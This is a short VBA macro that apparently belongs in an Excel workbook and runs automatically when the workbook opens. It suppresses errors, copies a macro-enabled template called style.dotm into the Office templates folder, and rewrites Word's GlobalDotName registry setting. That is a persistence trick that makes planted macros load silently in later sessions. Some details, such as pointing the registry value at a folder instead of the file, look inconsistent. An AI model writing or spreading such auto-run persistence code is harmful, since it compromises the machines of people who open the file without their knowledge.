Sub Workbook_Open()
    Dim shell As Object
    Dim fso As Object
    Dim templatePath As String
    Dim regPath As String

    Set shell = CreateObject("WScript.Shell")
    Set fso = CreateObject("Scripting.FileSystemObject")

    templatePath = Environ("APPDATA") & "\Microsoft\Excel\Templates\"
    On Error Resume Next
    fso.CopyFile Environ("USERPROFILE") & "\Documents\style.dotm", templatePath, True

    regPath = "HKEY_CURRENT_USER\Software\Microsoft\Office\16.0\Word\Options\GlobalDotName"
    shell.RegWrite regPath, templatePath, "REG_SZ"
    On Error GoTo 0
End Sub